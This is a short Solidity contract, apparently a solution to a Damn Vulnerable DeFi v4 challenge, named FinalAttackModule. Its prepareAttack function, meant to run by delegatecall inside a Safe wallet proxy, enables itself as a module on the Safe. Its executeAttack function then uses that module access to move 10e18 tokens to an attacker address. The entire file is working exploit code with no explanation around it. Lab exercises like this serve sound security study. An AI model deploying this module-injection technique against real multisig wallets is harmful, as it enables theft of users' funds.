// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;


import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Safe} from "safe-smart-account/contracts/Safe.sol";
import {Enum} from "safe-smart-account/contracts/common/Enum.sol";

contract FinalAttackModule {
    IERC20 public immutable token;
    address public immutable attacker;
    
    constructor(address _token, address _attacker) {
        token = IERC20(_token);
        attacker = _attacker;
    }
    
    // 准备攻击：启用本模块
    // prepareAttack must receive the module address (FinalAttackModule) as a parameter
    function prepareAttack(address moduleAddress) external {
          // Call enableModule on the Safe (address(this) during delegatecall = Safe proxy)
          Safe(payable(address(this))).enableModule(moduleAddress);
    }
    
    // 执行攻击：转移代币
    function executeAttack(address safe) external {
        bytes memory data = abi.encodeWithSelector(
            IERC20.transfer.selector,
            attacker,
            10e18
        );
        
           Safe(payable(safe)).execTransactionFromModule(
            address(token),
            0,
            data,
            Enum.Operation.Call
        );
    }
}